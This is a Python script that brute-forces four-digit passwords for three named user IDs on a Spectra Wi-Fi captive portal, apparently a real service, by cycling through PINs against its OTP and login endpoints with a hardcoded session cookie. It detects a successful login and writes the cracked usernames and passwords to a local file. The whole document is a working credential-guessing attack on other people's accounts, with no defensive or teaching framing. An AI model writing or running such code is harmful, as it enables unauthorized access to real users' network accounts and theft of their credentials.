import requests

# Define the base URL
base_url = 'http://10.201.21.1'

# Define the range of usernames
usernames = ["23TSFBA023", "23TSFBA035", "23TSFBA021"]

# Loop over each username
for username in usernames:
    logout = requests.get('http://10.201.21.1/logout?')
    # Loop over the range of passwords
    for password in range(1978, 10000):
        # First POST request
        otp_url = 'http://wifiunify38.spectra.co/userportal/pages/usermedia/spectra3/stanza-disable-random-mac/otp.jsp'
        otp_data = {
            'memberId': username
        }
        otp_cookies = {
            'JSESSIONID': 'A7A0859DC5ED1606979E3C1BDB502A78'
        }
        otp_response = requests.post(otp_url, data=otp_data, cookies=otp_cookies)

        # Second POST request
        login_url = 'http://wifiunify38.spectra.co/userportal/newlogin.do'
        login_data = {
            'username': 'STN-'+username,
            'password': password,
            'type': '2',
            'phone': '0',
            'jsonresponse': '1'
        }
        login_cookies = {
            'JSESSIONID': 'A7A0859DC5ED1606979E3C1BDB502A78'
        }
        login_response = requests.post(login_url, data=login_data, cookies=login_cookies)

        # Third POST request
        magic_url = 'http://10.201.21.1/login'
        magic_data = {
            'username': 'STN-'+username,
            'password': password,
            'magic': ''
        }
        magic_response = requests.post(magic_url, data=magic_data)

        # Convert the password to a 4-digit string
        password_str = f'{password:04}'

        # Define the data for the request
        magic_data = {
            'username': username,
            'password': password_str,
            'magic': ''
        }

        status_response = requests.get(f'{base_url}/')

        if "http://10.201.21.1/logout" in str(status_response._content):
            print(f"Login successful for username: {username}, password: {password_str}")

            # Write the username and password to a file
            with open("passwords_and_usernames.txt", "a") as f:
                f.write(f"Username: {username}, Password: {password_str}\n")

            break  # Exit the loop if login and status check are successful
        else:
            print("not connected, checked:", password)
